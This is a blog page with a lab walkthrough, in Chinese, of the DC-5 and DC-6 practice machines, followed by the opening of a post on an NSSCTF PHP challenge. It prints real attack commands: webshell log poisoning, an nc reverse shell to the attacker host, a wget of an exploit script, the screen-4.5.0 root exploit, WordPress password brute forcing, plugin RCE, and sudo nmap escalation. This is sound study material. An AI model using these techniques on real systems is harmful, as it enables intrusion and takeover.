  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">DC5-6靶机复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-08-06 14:44:19 / 修改时间：14:45:15" itemprop="dateCreated datePublished" datetime="2023-08-06T14:44:19+08:00">2023-08-06</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>4.1k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>7 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="DC5-6靶机复现"><a href="#DC5-6靶机复现" class="headerlink" title="DC5-6靶机复现"></a>DC5-6靶机复现</h1><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.0/24</span><br></pre></td></tr></table></figure>

<p>在扫描出来的结果中查找，有可疑端口的IP既为靶机地址</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A31.png" class>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx 1.6.2</span><br><span class="line">80  http</span><br><span class="line">111  rpcbind2-4</span><br><span class="line">53869 status</span><br></pre></td></tr></table></figure>

<p>可以看到目标靶机开放了80 111 53869三个端口，既然80端口开放了http服务，我们先访问一下</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>

<p>界面有5个选项，每一个选项点击之后都显示访问了不同的php文件，我们再来使用diresearch看看有没有隐藏的php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diresearch -u 192.168.10.139</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>

<p>发现除了刚刚那五个可以访问到的php文件就只剩footer.php文件了，我们尝试访问</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>

<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>

<p>可以看到footer.php的内容就是thankyou.php底部的内容（thankyou.php就是点击submit之后访问的php），并且每次重新访问thankyou.php之后再次重新访问footer.php，footer.php的内容也会变更至和footer.php一样，所以我们猜测thankyou.php包含了footer.php</p>
<p>那么这其中就存在了文件包含漏洞，那我们首先找寻一下包含的是那】哪个参数，这里就使用burpsuite</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png" class>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37png.png" class>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>

<p>模式就设置为sniper模式，进行爆破</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>

<p>得到变量名应该是file</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>

<p>可以看到包含并访问成功</p>
<h3 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h3><p>上面得知，这个http的服务器是nginx1.6.2，而我们已经知道nginx的日志文件是access.log根据之前所做过的一道类似ctf题，我们抓包进行UA配合日志文件传木马</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>

<p>放包成功写入，再次包含访问日志文件，然后用蚁剑配合我们刚上传上去的一句话木马进行访问</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>

<p>进去之后使用蚁剑打开虚拟终端进行一些基础操作</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>

<p>可以看到我们现在只是一个www-data的普通用户，并不是root，但是始终使用这个终端有点不方便（因为没有那么多工具），使用nc来反弹shell到我们kali的攻击机上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.10.129 4441</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>

<p>反弹shell成功，拿到shell，首先使用python语言来获得交互式shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来就是提权啦，想到最常见的就是suid提权，使用下面的语句来查看哪些命令具有suid权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>

<p>发现其中有一个screen-4.5.0很可疑，使用kali自带的漏洞库对其进行查找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>

<p>根据版本，一眼就看中了这俩，我们分别查看一下其中内容，在41154.sh里面发现了直接的步骤</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>

<p>可以看到EOF隔开了我们要创建的文件和结束后需要执行的命令</p>
<p><strong>第一部分</strong></p>
<p>在tmp目录下创建libhax.c文件，将内容复制进去，这个我们在蚁剑里执行即可</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png" class>

<p><strong>第二部分</strong></p>
<p>第二部分就是在&#x2F;tmp目录下创建一个rootshell.c文件，然后保存后执行相应命令</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png" class>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322.png" class>

<p><strong>第三部分</strong></p>
<p>创建一个.sh文件，文件内容为所给步骤中的剩余代码，前面记得加上#!&#x2F;bin&#x2F;bash，注意：保存要输入set ff&#x3D;unix，是为了防止脚本的格式错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p>我们先在kali机上创建一个d.sh文件，然后再将他下载到靶机上：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim d.sh</span><br><span class="line">mv d.sh /var/www/html</span><br></pre></td></tr></table></figure>

<p>在靶机上的&#x2F;tmp目录下进行下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.10.129/d.sh</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png" class>

<p>成功写入</p>
<p><strong>如果觉得第三部分像上面这么做比较麻烦，难以理解，也可以依次输入exp里剩下的命令</strong></p>
<p>接下来就是使用蚁剑反弹给kali的shell继续执行下一步的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x d.sh</span><br><span class="line">./d.sh</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png" class>

<p>成功拿到root权限</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-5%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325.png" class>

<p>成功拿到flag。</p>
<h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩，使用nmap找到目标靶机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.0/24</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png" class>

<p>一眼就相中了这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80 http Apache2.4.25</span><br><span class="line">22 ssh</span><br></pre></td></tr></table></figure>

<p>下面访问一下80端口，看一下界面，一开始是访问失败的哈，所以要像DC2一样将对应ip和域名写进C:\Windows\System32\drivers\etc\hosts里面</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>

<p>之后直接在浏览器尝试访问，访问时间有点长，稍安勿躁</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>

<p>可以看到有cms为wordpress，那我们就想到的是DC2用到的针对wordpress的渗透工具wpscan，首先使用dirb，或者diresearch扫一下目录</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>

<p>依次访问一下，很快就在其中找到了登录界面</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png" class>

<h3 id="爆破进行登录"><a href="#爆破进行登录" class="headerlink" title="爆破进行登录"></a>爆破进行登录</h3><p>我们既然知道了有wpscan，那就用wpscan爆破一下用户名和密码，先爆破用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -e u</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png" class>

<p>扫描到五个用户，将他们全部输出到users.txt里面，也可以使用命令在扫描时就生成或者自己写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin&quot; &gt; users.txt</span><br><span class="line">echo &quot;graham&quot; &gt;&gt; users.txt</span><br><span class="line">echo &quot;mark&quot; &gt;&gt; users.txt</span><br><span class="line">echo &quot;sarah&quot; &gt;&gt; users.txt</span><br><span class="line">echo &quot;jens&quot; &gt;&gt; users.txt</span><br></pre></td></tr></table></figure>

<p>下一步就是通过cewl来尝试生成密码字典进行爆破登录了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://wordy -w passwd.txt</span><br></pre></td></tr></table></figure>

<p>密码字典生成之后再使用wpscan进行用户名与密码的爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>

<p>这样子爆破失败了，我们还是使用kali自带的密码字典吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#先解压密码字典</span><br><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; pwd.txt</span><br><span class="line"></span><br><span class="line">#用户名和密码字典都有了，开始爆破</span><br><span class="line">wpscan --url wordy -U user.txt -P pwd.txt</span><br><span class="line">#爆破出来账号：mark 密码：helpdesk01</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>

<p>登陆进去</p>
<h3 id="漏洞查找-amp-反弹shell"><a href="#漏洞查找-amp-反弹shell" class="headerlink" title="漏洞查找&amp;反弹shell"></a>漏洞查找&amp;反弹shell</h3><img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>

<p>这里不知道该咋办，看看wp，发现是Activity monitor这个插件存在远程代码执行漏洞</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>

<p>使用45274.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>

<p>里面给出了代码，我们把他复制一份出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</span><br><span class="line">vim 45274.html</span><br><span class="line"></span><br><span class="line">#攻击机上监听端口</span><br><span class="line">nc -lvvp 4441</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>

<p>1的地方改为我们的目标网址，2的地方就改成我们的攻击机和监听端口</p>
<p>开启攻击机的http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>

<p>点击submit request之后就拿到了反弹后的shell</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>

<p>使用python语言获得交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>之后还是常见的查看是否有suid提权，没什么发现</p>
<p>进入到mark用户的家目录下，stuff文件下有一个things-to-do.txt文件，查看文件内容发现graham用户及登录密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/mark/stuff</span><br><span class="line">cat things-to-do.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>

<p>发现了新用户graham ，密码为GSo7isUM1D4尝试使用su进行用户登录</p>
<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>

<p>可以看到登录成功，接下来再看看有当前用户可执行操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>

<p>发现&#x2F;home&#x2F;jens&#x2F;backups.sh是不需要密码的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本（因为这个脚本是在jens用户目录下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</span><br><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>

<p>可以看到切换成功，再次使用sudo-l看看jens用户可执行什么命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png" class>

<p>发现jens用户可以无密码执行&#x2F;usr&#x2F;bin&#x2F;nmap命令</p>
<p>百度到可以写入一条命令到getShell，并通过nmap运行getShell成功进入root用户，在&#x2F;root目录下找到theflag.txt文件（注意切换目录）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> theflag.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png" class>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">NSSCTF刷题</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-08-02 18:34:55 / 修改时间：18:35:57" itemprop="dateCreated datePublished" datetime="2023-08-02T18:34:55+08:00">2023-08-02</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>42k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:16</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="暑假题目"><a href="#暑假题目" class="headerlink" title="暑假题目"></a>暑假题目</h1><h2 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h2><p>先看题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;</span><br><span class="line">    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br><span class="line">            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;yee&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;nop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;go on&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;let&#x27;s get some php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; let&#x27;s get some php</span><br></pre></td></tr></table></figure>

